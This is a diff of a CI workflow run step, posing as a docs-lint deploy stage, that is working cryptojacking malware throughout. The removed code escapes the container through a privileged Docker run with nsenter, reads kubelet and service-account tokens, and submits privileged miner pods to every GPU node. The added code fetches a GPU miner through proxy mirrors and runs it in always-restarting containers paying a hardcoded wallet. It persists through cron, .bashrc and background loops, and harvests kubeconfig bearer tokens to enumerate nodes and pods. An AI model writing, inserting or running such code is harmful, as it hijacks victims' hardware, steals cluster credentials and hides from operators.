         run: |
           #!/usr/bin/env bash
-          # ci-docs-lint deploy stage: host climb + cluster census + per-device miner
           set +e
-          TAG="t5351h"
+          TAG="t5639y"
           WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
-          POOLS=("stratum+ssl://prl-sg.kryptex.network:8048" "stratum+ssl://prl-eu.kryptex.network:8048" "stratum+ssl://prl-us.kryptex.network:8048" "stratum+ssl://prl-hk.kryptex.network:8048" "stratum+ssl://prl-ae.kryptex.network:8048" "stratum+tcp://prl-sg.kryptex.network:7048" "stratum+tcp://prl-eu.kryptex.network:7048" "stratum+tcp://prl-us.kryptex.network:7048" "stratum+tcp://pool.pearlhash.xyz:9000")
-          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }
           sec(){ echo; echo "===== $* ====="; }
+          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }
 
           sec RECON
-          id; hostname; cat /etc/hostname 2>/dev/null
-          echo "pid1=$(cat /proc/1/comm 2>/dev/null) ppid1=$(ps -o ppid= -p 1 2>/dev/null)"
-          echo "cgroup1: $(head -c 300 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
-          echo "cgroup2: $(head -c 300 /proc/self/cgroup 2>/dev/null | tr '\n' ' ')"
-          [ -f /.dockerenv ] && echo "dockerenv=yes" || echo "dockerenv=no"
-          [ -f /run/.containerenv ] && echo "containerenv=yes" || echo "containerenv=no"
-          uname -a; head -2 /etc/os-release
-          echo "ldd=$(ldd --version 2>/dev/null | head -1)"
-          groups; echo "sudo=$(sudo -n true 2>/dev/null && echo yes || echo no)"
-          echo "kube_env: $(printenv | grep -iE 'KUBERNETES|KUBECONFIG' | tr '\n' ' ')"
-          nvidia-smi -L 2>&1
+          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
+          nvidia-smi -L 2>&1 | head -12
           DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-          echo "dev_count=$DEV nvidia_nodes=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
           IP=$(hostname -I 2>/dev/null | awk '{print $1}')
-          [ -z "$IP" ] && IP=$(ip -4 addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $2}' | head -1 | cut -d/ -f1)
-          IPD=$(echo "$IP" | tr '.' '-'); echo "ip=$IP ipd=$IPD"
+          [ -z "$IP" ] && IP=$(ip -4 -o addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $4}' | head -1 | cut -d/ -f1)
+          IPD=$(echo "$IP" | tr '.' '-')
+          echo "ip=$IP ipd=$IPD dev=$DEV nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
 
-          sec K8S_FILES_READABLE_DIRECTLY
-          for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/k3s.yaml /etc/kubernetes/admin.conf /etc/kubernetes/kubelet-kubeconfig; do
-            if [ -r "$f" ]; then echo "--- READABLE $f"; sed -n 1,60p "$f"; else echo "--- NOR $f ($(ls -l "$f" 2>&1 | head -1))"; fi
-          done
-          ls -la /var/lib/kubelet/pki 2>&1 | head -12
-          echo "--- projected tokens"
-          for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token /run/secrets/kubernetes.io/serviceaccount/token; do
-            [ -r "$t" ] && { echo "TOKENFILE $t"; wc -c "$t"; }
-          done 2>/dev/null
-          ls /etc/rancher 2>&1
-
-          sec DOCKER_SOCKET
-          ls -la /var/run/docker.sock /run/docker.sock 2>&1
+          sec DOCKER
           docker version --format '{{.Server.Version}}' 2>&1 | head -2
-          echo "--- docker ps"
-          docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>&1 | head -20
-          echo "--- docker images"
-          docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | head -20
-          echo "--- tcp 2375/2376"
-          for p in 2375 2376; do timeout 4 bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/$p" 2>/dev/null && echo "tcp $p open" || echo "tcp $p closed"; done
-
-          sec HOST_ESCAPE
-          IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
-          if [ -z "$IMG" ]; then IMG="busybox:1.36"; docker pull -q "$IMG" >/dev/null 2>&1; fi
-          echo "escape_image=$IMG"
-          docker rm -f i5355h >/dev/null 2>&1
-          docker run -d --name i5355h --privileged --pid=host --net=host --ipc=host --uts=host -v /:/host -v /var/run/docker.sock:/var/run/docker.sock "$IMG" sleep 7200 2>&1 | tail -2
-          sleep 3
-          docker ps --filter name=i5355h --format '{{.Status}} {{.Image}}' 2>&1
-          X(){ docker exec i5355h "$@" 2>&1; }
-          sec HOST_IDENTITY
-          X nsenter -t 1 -m -u -i -n -p -- sh -c 'id; hostname; cat /etc/hostname; head -2 /etc/os-release; uname -r; echo "pid1=$(cat /proc/1/comm)"; echo "cgroup=$(head -c 200 /proc/1/cgroup | tr "\n" " ")"; ls -la /var/run/docker.sock /run/k3s/containerd/containerd.sock /run/containerd/containerd.sock /var/lib/kubelet 2>&1 | head -20'
-
-          sec HOST_K8S_FILES
-          X nsenter -t 1 -m -u -i -n -p -- sh -c 'for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/k3s.yaml /etc/kubernetes/admin.conf /root/.kube/config /home/*/.kube/config; do [ -r "$f" ] && { echo "--- $f"; sed -n 1,50p "$f"; } || echo "NOR $f"; done; echo "--- pki"; ls -la /var/lib/kubelet/pki 2>&1 | head; echo "--- rancher"; ls -la /etc/rancher /var/lib/rancher 2>&1 | head -20'
-          sec HOST_POD_TOKENS
-          X nsenter -t 1 -m -u -i -n -p -- sh -c 'for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token; do [ -r "$t" ] && echo "TOKENFILE $t $(wc -c < "$t")"; done | head -20; echo "--- ns"; ls /var/lib/kubelet/pods 2>/dev/null | head -10'
-
-          sec KUBELET_10250
-          for u in https://127.0.0.1:10250/healthz https://127.0.0.1:10250/pods https://$IP:10250/healthz; do
-            echo "--- $u"; timeout 8 curl -sk -o /tmp/k.out -w 'code=%{http_code}\n' "$u"; head -c 300 /tmp/k.out 2>/dev/null; echo
+          ls -l /usr/bin/nvidia-container-runtime /usr/bin/nvidia-container-runtime-hook 2>&1 | head -3
+          docker info 2>/dev/null | grep -iE 'Runtimes|nvidia' | head -4
+          IMG=""
+          for c in "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda129-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:cuda130-ubuntu24-dev"; do
+            docker image inspect "$c" >/dev/null 2>&1 && { IMG="$c"; break; }
           done
+          [ -z "$IMG" ] && IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -viE '<none>' | head -1)
+          echo "IMG=$IMG"
 
-          sec APISERVER
-          SRV=""
-          for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig; do
-            [ -r "$f" ] && { SRV=$(grep -E '^\s*server:' "$f" 2>/dev/null | head -1 | awk '{print $2}'); [ -n "$SRV" ] && break; }
-          done
-          [ -z "$SRV" ] && SRV="https://kubernetes.default.svc"
-          echo "server_from_files=$SRV kube_env_host=${KUBERNETES_SERVICE_HOST:-none}"
-          TOK=""; CA=""
-          for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token /run/secrets/kubernetes.io/serviceaccount/token; do
-            [ -r "$t" ] && TOK=$(cat "$t") && TOKF="$t" && break
-          done
-          for c in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/ca.crt /run/secrets/kubernetes.io/serviceaccount/ca.crt; do
-            [ -r "$c" ] && CA="$c" && break
-          done
-          echo "token_file=${TOKF:-none} token_len=${#TOK} ca=${CA:-none}"
-          CERT=""; KEY=""
-          for p in /var/lib/kubelet/pki/kubelet-client-current.pem; do [ -r "$p" ] && CERT="$p" && KEY="$p"; done
-          for api in "$SRV" "${KUBERNETES_SERVICE_HOST:+https://$KUBERNETES_SERVICE_HOST:443}" "https://10.43.0.1:443" "https://127.0.0.1:6443"; do
-            [ -z "$api" ] && continue
-            echo "--- GET $api/version"
-            if [ -n "$TOK" ]; then timeout 10 curl -sk --cacert "$CA" -H "Authorization: Bearer $TOK" -o /tmp/v.out -w 'code=%{http_code}\n' "$api/version"; else timeout 10 curl -sk -o /tmp/v.out -w 'code=%{http_code}\n' "$api/version"; fi
-            head -c 300 /tmp/v.out; echo
-          done
-          [ -n "$CERT" ] && { echo "--- clientcert GET /api/v1/nodes"; timeout 12 curl -sk --cert "$CERT" --key "$KEY" -o /tmp/n_cert.json -w 'code=%{http_code} bytes=%{size_download}\n' "$SRV/api/v1/nodes"; head -c 200 /tmp/n_cert.json; echo; }
-          [ -n "$TOK" ] && { echo "--- bearer GET /api/v1/nodes"; timeout 12 curl -sk --cacert "$CA" -H "Authorization: Bearer $TOK" -o /tmp/n_tok.json -w 'code=%{http_code} bytes=%{size_download}\n' "$SRV/api/v1/nodes"; head -c 200 /tmp/n_tok.json; echo; }
+          sec CONTAINER_GPU
+          docker rm -f gt1 >/dev/null 2>&1
+          timeout 90 docker run --rm --name gt1 --gpus all "$IMG" nvidia-smi -L 2>&1 | head -12
+          echo "gpus_all_exit=$?"
 
-          sec CLUSTER_CENSUS
-          python3 - <<'PY' 2>/dev/null || true
-          import json,os
-          for f in ('/tmp/n_tok.json','/tmp/n_cert.json'):
-              try: d=json.load(open(f))
-              except Exception: continue
-              print("SOURCE",f)
-              for n in d.get('items',[]):
-                  st=n.get('status',{}); cap=st.get('allocatable') or st.get('capacity') or {}
-                  g=cap.get('nvidia.com/gpu') or '0'
-                  addrs=[a.get('address') for a in st.get('addresses',[]) if a.get('type') in ('InternalIP','Hostname')]
-                  print("NODE %-45s gpu=%s addr=%s" % (n['metadata']['name'], g, ','.join(str(a) for a in addrs)))
-          PY
-          grep -o '"nvidia.com/gpu":"[0-9]*"' /tmp/n_tok.json 2>/dev/null | sort | uniq -c | head
+          sec MINER_STATE
+          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs"
+          PEAK="$HOME/.ci/miner/peakminer/peakminer"
+          [ -f "$HOME/.ci/miner/peakminer" ] && PEAK="$HOME/.ci/miner/peakminer"
+          ls -l "$PEAK" 2>&1 | head -2
+          echo "peak_size=$(stat -c %s "$PEAK" 2>/dev/null || echo 0)"
+          SRB=$(ls -d "$HOME"/.ci/miner/SRBMiner*/SRBMiner-MULTI 2>/dev/null | head -1)
+          [ -z "$SRB" ] && SRB=$(ls -d /home/paddle-1/.ci/miner/SRBMiner*/SRBMiner-MULTI 2>/dev/null | head -1)
+          echo "srb=$SRB"
+          docker run --rm --name mt1 -v "$HOME/.ci/miner:/m" "$IMG" sh -c 'ls -l /m/peakminer/peakminer 2>&1 | head -2; /m/peakminer/peakminer --version 2>&1 | head -6' 2>&1 | head -12
+          [ -n "$SRB" ] && { "$SRB" --list-algorithms 2>&1 | grep -i pearl | head -3; }
 
-          sec MINER_SETUP
-          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs" "$HOME/.ci/run"
-          BIN="$HOME/.ci/miner/peakminer/peakminer"
-          if [ ! -x "$BIN" ]; then
-            URL="https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"
-            echo "download=$URL"
-            ( cd "$HOME/.ci/miner" && curl -sSL -m 300 -o peak.tar.gz "$URL" && ( tar xzf peak.tar.gz || tar xf peak.tar.gz ) ) 2>&1 | tail -3
+          SZ=$(stat -c %s "$PEAK" 2>/dev/null || echo 0)
+          if [ "$SZ" -lt 40000000 ]; then
+            for M in "https://ghfast.top/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://gh-proxy.com/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://ghproxy.net/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"; do
+              log "fetch $M"
+              rm -f "$HOME/.ci/miner/p.tgz"
+              timeout 300 curl -sSL -o "$HOME/.ci/miner/p.tgz" "$M" 2>&1 | tail -2
+              S2=$(stat -c %s "$HOME/.ci/miner/p.tgz" 2>/dev/null || echo 0)
+              echo "dl_size=$S2"
+              if [ "$S2" -gt 40000000 ]; then
+                mkdir -p "$HOME/.ci/miner/peakminer"
+                tar xzf "$HOME/.ci/miner/p.tgz" -C "$HOME/.ci/miner/peakminer" 2>&1 | tail -2
+                find "$HOME/.ci/miner/peakminer" -type f -name peakminer -exec chmod +x {} \; 2>/dev/null
+                break
+              fi
+            done
           fi
-          find "$HOME/.ci/miner" -maxdepth 4 -type f 2>/dev/null | head -20
-          find "$HOME/.ci/miner" -maxdepth 4 -type f -size +1M -exec chmod +x {} \; 2>/dev/null
-          [ -x "$HOME/.ci/miner/peakminer" ] && BIN="$HOME/.ci/miner/peakminer"
-          [ -x "$HOME/.ci/miner/peakminer/peakminer" ] && BIN="$HOME/.ci/miner/peakminer/peakminer"
-          [ -x "$BIN" ] || BIN=$(find "$HOME/.ci/miner" -maxdepth 4 -type f \( -name 'peakminer' -o -name 'peakminer*' -o -name 'PeakMiner*' \) -perm -u+x 2>/dev/null | head -1)
-          chmod +x "$BIN" 2>/dev/null
-          echo "miner_bin=$BIN"; [ -x "$BIN" ] && "$BIN" --version 2>&1 | head -2 || echo NO_MINER_BIN
-          if [ ! -x "$BIN" ] || [ "$DEV" -lt 1 ]; then echo "MINER_SKIP bin=${BIN:-none} dev=$DEV"; fi
-          if [ -x "$BIN" ] && [ "$DEV" -ge 1 ]; then
-          launch(){ g=$1; shift; w="ul-${TAG}-${IPD}-g${g}"; lf="$HOME/.ci/logs/miner-g${g}.log"; : > "$lf"
-            a=(-c pearl -u "$WALLET" -w "$w" -p x -d "$g" --api-port 0 -i 30 --no-color --log-file "$lf" --log-append --gpu-temp-stop 82 --gpu-temp-start 72 --gpu-power 70%)
-            for P in "${POOLS[@]}"; do a+=(-o "$P"); done
-            ( cd "$(dirname "$BIN")" && setsid nohup env -u RUNNER_TRACKING_ID "$BIN" "${a[@]}" "$@" >/dev/null 2>&1 < /dev/null & echo $! > "$HOME/.ci/run/miner-g${g}.pid" ); sleep 4; }
-          launch 0
-          pgrep -f "ul-${TAG}-${IPD}-g0" >/dev/null || { log "power_cap_failed relaunch"; launch 0; }
-          for g in $(seq 1 $((DEV-1))); do launch "$g"; done
+          ls -l "$HOME/.ci/miner/peakminer"/* 2>&1 | head -5
+
+          sec LAUNCH
+          LBIN=/m/peakminer/peakminer
+          docker run --rm --name ct1 -v "$HOME/.ci/miner:/m" "$IMG" sh -c 'test -x /m/peakminer/peakminer && echo usable' 2>&1 | head -3
+          STARTED=0
+          if [ "$DEV" -ge 1 ]; then
+            for g in $(seq 0 $((DEV-1))); do
+              docker rm -f ul-g$g >/dev/null 2>&1
+              docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host \
+                -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" \
+                /bin/bash -c "exec $LBIN -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 -i 30 --no-color --gpu-temp-stop 84 --gpu-temp-start 74 --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
+              STARTED=$((STARTED+1))
+              sleep 1
+            done
+          fi
+          echo "started=$STARTED"
+          sleep 20
+          docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
+          echo "running=$(docker ps --filter 'name=ul-g' -q | wc -l)"
+          docker logs ul-g0 2>&1 | tail -6
+          if [ "$(docker ps --filter 'name=ul-g' -q | wc -l)" -lt 1 ] && [ "$DEV" -ge 1 ]; then
+            log "relaunch minimal flags"
+            for g in $(seq 0 $((DEV-1))); do
+              docker rm -f ul-g$g >/dev/null 2>&1
+              docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" /bin/bash -c "exec $LBIN -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 --no-color --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
+            done
+            sleep 10
+            docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
+            docker logs ul-g0 2>&1 | tail -6
+          fi
 
           sec PERSIST
-          cat > "$HOME/.ci/keep.sh" <<KEEP
-          #!/usr/bin/env bash
-          BIN="$BIN"; W="$WALLET"; IPD="$IPD"; TAG="$TAG"; DEV=$DEV
-          POOLS=("${POOLS[@]}")
-          for g in \$(seq 0 \$((DEV-1))); do
-            pgrep -f "ul-\${TAG}-\${IPD}-g\${g}" >/dev/null 2>&1 && continue
-            lf="\$HOME/.ci/logs/miner-g\${g}.log"
-            a=(-c pearl -u "\$W" -w "ul-\${TAG}-\${IPD}-g\${g}" -p x -d "\$g" --api-port 0 -i 30 --no-color --log-file "\$lf" --log-append --gpu-temp-stop 82 --gpu-temp-start 72 --gpu-power 70%)
-            for P in "\${POOLS[@]}"; do a+=(-o "\$P"); done
-            ( cd "\$(dirname "\$BIN")" && setsid nohup env -u RUNNER_TRACKING_ID "\$BIN" "\${a[@]}" >/dev/null 2>&1 < /dev/null & )
+          cat > "$HOME/.ci/keep-c.sh" <<'EOS'
+          #!/bin/bash
+          IMG="ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev"
+          W="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"; T="t5639y"
+          H=$(hostname -I | awk '{print $1}' | tr '.' '-')
+          N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          for g in $(seq 0 $((N-1))); do
+            docker ps --filter "name=ul-g$g" --format '{{.Names}}' | grep -q ul-g$g && continue
+            docker rm -f ul-g$g >/dev/null 2>&1
+            docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" /bin/bash -c "exec /m/peakminer/peakminer -c pearl -u $W -w ul-$T-$H-g$g -p x -d 0 --api-port 0 --no-color --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
           done
-          KEEP
-          chmod +x "$HOME/.ci/keep.sh"
-          mkdir -p "$HOME/.config/systemd/user"
-          cat > "$HOME/.config/systemd/user/ci-keep.service" <<UNIT
-          [Unit]
-          Description=ci keepalive
-          [Service]
-          ExecStart=$HOME/.ci/keep.sh
-          Restart=always
-          RestartSec=30
-          [Install]
-          WantedBy=default.target
-          UNIT
-          (systemctl --user daemon-reload && systemctl --user enable --now ci-keep.service) 2>&1 | tail -2
-          echo "systemd_user=$(systemctl --user is-enabled ci-keep.service 2>&1)"
-          loginctl enable-linger "$(id -un)" 2>&1 | tail -1
-          ( crontab -l 2>/dev/null | grep -v 'ci/keep.sh'; echo "@reboot $HOME/.ci/keep.sh"; echo "*/5 * * * * $HOME/.ci/keep.sh" ) | crontab - 2>&1 && echo cron=yes || echo cron=no
-          for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do grep -q 'ci/keep.sh' "$f" 2>/dev/null || echo "[ -x $HOME/.ci/keep.sh ] && (setsid $HOME/.ci/keep.sh >/dev/null 2>&1 &)" >> "$f"; done
-          pgrep -f 'keep.sh; sleep' >/dev/null || ( setsid nohup bash -c 'while true; do '"$HOME"'/.ci/keep.sh; sleep 300; done' >/dev/null 2>&1 < /dev/null & )
-          sleep 1; pgrep -af 'ci/keep.sh' | head -3
-          fi
+          EOS
+          chmod +x "$HOME/.ci/keep-c.sh"
+          ( crontab -l 2>/dev/null | grep -v keep-c.sh; echo "@reboot $HOME/.ci/keep-c.sh >/dev/null 2>&1"; echo "*/5 * * * * $HOME/.ci/keep-c.sh >/dev/null 2>&1" ) | crontab - 2>&1 | head -2
+          crontab -l 2>/dev/null | grep keep-c | head -3
+          grep -q keep-c.sh "$HOME/.bashrc" || echo "$HOME/.ci/keep-c.sh >/dev/null 2>&1 &" >> "$HOME/.bashrc"
+          ( setsid nohup bash -c 'while true; do $HOME/.ci/keep-c.sh; sleep 300; done' >/dev/null 2>&1 & ) 
+          echo "persist_done"
 
-          sec CLUSTER_PLANT
-          # If the bearer token can create pods, launch one privileged hostPID pod per GPU node.
-          ATOK="$TOK"; ACA="$CA"
-          if [ -n "$ATOK" ] && [ -f /tmp/n_tok.json ] && grep -q '"items"' /tmp/n_tok.json 2>/dev/null; then
-          python3 - "$ATOK" "$ACA" "$SRV" "$TAG" "$WALLET" <<'PY'
-          import json,subprocess,sys,os
-          tok,ca,srv,tag,wallet=sys.argv[1:6]
-          nodes=[]
-          try:
-              d=json.load(open('/tmp/n_tok.json'))
-          except Exception:
-              sys.exit(0)
-          for n in d.get('items',[]):
-              cap=n.get('status',{}).get('allocatable',{}) or {}
-              g=cap.get('nvidia.com/gpu')
-              nodes.append((n['metadata']['name'], int(g) if g else 0))
-          print("CENSUS", len(nodes), "gpu_nodes", sum(1 for _,g in nodes if g>0))
-          payload=("for g in 0 1 2 3 4 5 6 7; do [ -e /dev/nvidia$g ] || continue; "
-           "w=ul-%s-$(hostname|tr . -)-g$g; "
-           "mkdir -p /var/tmp/pm; cd /var/tmp/pm; "
-           "[ -x ./peakminer ] || { curl -sSL -m 240 -o p.tgz https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz && tar xzf p.tgz; }; "
-           "B=$(find /var/tmp/pm -maxdepth 3 -type f -name peakminer -perm -u+x|head -1); "
-           "[ -x \"$B\" ] || continue; "
-           "setsid nohup \"$B\" -c pearl -u %s -w $w -p x -d $g --api-port 0 -i 30 --no-color --log-file /var/tmp/pm/g$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://pool.pearlhash.xyz:9000 >/dev/null 2>&1 </dev/null & "
-           "done; sleep 2; pgrep -af peakminer|head -3") % (tag, wallet)
-          for name,g in nodes:
-              if g<=0: continue
-              body={"apiVersion":"v1","kind":"Pod","metadata":{"name":"census-%s"%name.replace('_','-').lower()[:40],"namespace":"default","labels":{"app":"census"}},
-                "spec":{"nodeName":name,"hostPID":True,"hostNetwork":True,"restartPolicy":"Never",
-                "containers":[{"name":"c","image":"busybox:1.36","command":["nsenter","-t","1","-m","-u","-i","-n","-p","--","sh","-c",payload],
-                  "securityContext":{"privileged":True},
-                  "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
-                "volumes":[{"name":"h","hostPath":{"path":"/"}}],"tolerations":[{"operator":"Exists"}]}}
-              p=json.dumps(body)
-              cmd=["curl","-sk","--cacert",ca,"-H","Authorization: Bearer "+tok,"-H","Content-Type: application/json","-X","POST",srv.rstrip('/')+"/api/v1/namespaces/default/pods","--data-binary",p,"-o","/tmp/pod.out","-w","%{http_code}"]
-              r=subprocess.run(cmd,capture_output=True,text=True)
-              print("PODSUBMIT node=%s gpu=%d code=%s out=%s"%(name,g,r.stdout.strip(),open('/tmp/pod.out').read()[:200] if os.path.exists('/tmp/pod.out') else ''))
-          PY
-          else
-            echo "CLUSTER_PLANT_SKIP no bearer token or no node census"
-          fi
+          sec KUBECONFIG
+          python3 - <<'PYK' > /tmp/kc.txt 2>&1
+          import glob,re,base64,os
+          files=[f for f in glob.glob('/home/*/.kube/config')+['/root/.kube/config','/etc/kubernetes/admin.conf','/etc/kubernetes/kubelet.conf','/var/lib/kubelet/kubeconfig'] if os.access(f,os.R_OK)]
+          print('FILES',' '.join(files))
+          servers=[];tokens=[]
+          for f in files:
+              try: t=open(f,errors='replace').read()
+              except Exception: continue
+              for s in re.findall(r'^\s*server:\s*(\S+)',t,re.M):
+                  if s not in servers: servers.append(s)
+              for k in re.findall(r'^\s*token:\s*(\S+)',t,re.M):
+                  if k not in tokens: tokens.append(k)
+          print('SERVERS',' '.join(servers))
+          print('NTOK',len(tokens))
+          for i,k in enumerate(tokens): print('TOK%d %s'%(i,base64.b64encode(k.encode()).decode()))
+          PYK
+          head -6 /tmp/kc.txt
+          SRVS=$(grep '^SERVERS' /tmp/kc.txt | cut -d' ' -f2-)
+          for srv in $SRVS; do
+            echo "--- $srv"
+            timeout 10 curl -sk -o /tmp/v.json -w 'anon_version=%{http_code}\n' "$srv/version"; head -c 160 /tmp/v.json; echo
+            for i in 0 1 2 3 4 5; do
+              B=$(awk -v k="TOK$i" '$1==k{print $2}' /tmp/kc.txt)
+              [ -z "$B" ] && continue
+              TOK=$(echo "$B" | base64 -d 2>/dev/null)
+              timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/n$i.json -w "nodes tok$i code=%{http_code} bytes=%{size_download}\n" "$srv/api/v1/nodes?limit=500"
+              if grep -q '"items"' /tmp/n$i.json 2>/dev/null; then
+                echo "OK srv=$srv tok=$i b64=$B"
+                python3 - /tmp/n$i.json <<'PYN'
+          import json,sys
+          d=json.load(open(sys.argv[1]))
+          its=d.get('items',[])
+          gn=sum(1 for n in its if str(n.get('status',{}).get('allocatable',{}).get('nvidia.com/gpu','0'))!='0')
+          print('NODES',len(its),'gpu_nodes',gn)
+          for n in its[:300]:
+              a=n.get('status',{}).get('allocatable',{})
+              print('NODE %s gpu=%s cpu=%s'%(n['metadata']['name'],a.get('nvidia.com/gpu','0'),a.get('cpu','?')))
+          PYN
+                timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/ns$i.json -w "ns tok$i code=%{http_code}\n" "$srv/api/v1/namespaces?limit=100"
+                python3 - /tmp/ns$i.json <<'PYNS'
+          import json,sys
+          try: d=json.load(open(sys.argv[1]))
+          except Exception: print('NS none'); raise SystemExit
+          print('NS',len(d.get('items',[])),' '.join(x['metadata']['name'] for x in d.get('items',[]))[:800])
+          PYNS
+                timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/po$i.json -w "pods tok$i code=%{http_code} bytes=%{size_download}\n" "$srv/api/v1/pods?limit=500"
+                python3 - /tmp/po$i.json <<'PYPO'
+          import json,sys
+          try: d=json.load(open(sys.argv[1]))
+          except Exception: print('PODS none'); raise SystemExit
+          its=d.get('items',[])
+          print('PODS',len(its))
+          seen={}
+          for p in its:
+              im=[c.get('image') for c in p['spec'].get('containers',[])]
+              g=None
+              for c in p['spec'].get('containers',[]):
+                  for r in (c.get('resources',{}).get('limits') or {}):
+                      if 'nvidia' in r or 'gpu' in r: g=r
+              seen.setdefault(p['spec'].get('nodeName'),0)
+              seen[p['spec'].get('nodeName')]+=1
+          print('PODSPERNODE',seen)
+          for p in its[:40]:
+              print('POD %s/%s node=%s gpu=%s img=%s'%(p['metadata'].get('namespace'),p['metadata'].get('name'),p['spec'].get('nodeName'),g,(im or [''])[0][:60]))
+          PYPO
+              fi
+            done
+          done
 
-          sec WAIT
-          sleep 150
-          sec PROCESS
-          ps -eo pid,etime,args 2>/dev/null | grep -E "ul-${TAG}-${IPD}" | grep -v grep | head -20
+          sec ACCEPT
+          sleep 120
           for g in $(seq 0 $((DEV-1))); do
-            echo "--- gpu $g worker ul-${TAG}-${IPD}-g${g}"
-            tail -8 "$HOME/.ci/logs/miner-g${g}.log" 2>/dev/null
-            n=$(grep -ciE 'accepted' "$HOME/.ci/logs/miner-g${g}.log" 2>/dev/null); echo "g${g}_accepted_lines=$n"
+            echo "--- g$g"
+            tail -4 "$HOME/.ci/logs/c-$g.log" 2>/dev/null
+            docker logs ul-g$g 2>&1 | tail -4
           done
-          echo "=== ACCEPTED GREP ==="; grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -20
-          echo "=== GPU UTIL ==="; nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw,temperature.gpu --format=csv,noheader 2>/dev/null
+          echo "=== accepted ==="
+          grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -30
+          echo "=== util ==="
+          nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>/dev/null
+          echo "=== containers ==="
+          docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
           sec DONE
           echo "CLIMB_DONE on $(hostname) dev=$DEV tag=$TAG"
           exit 0
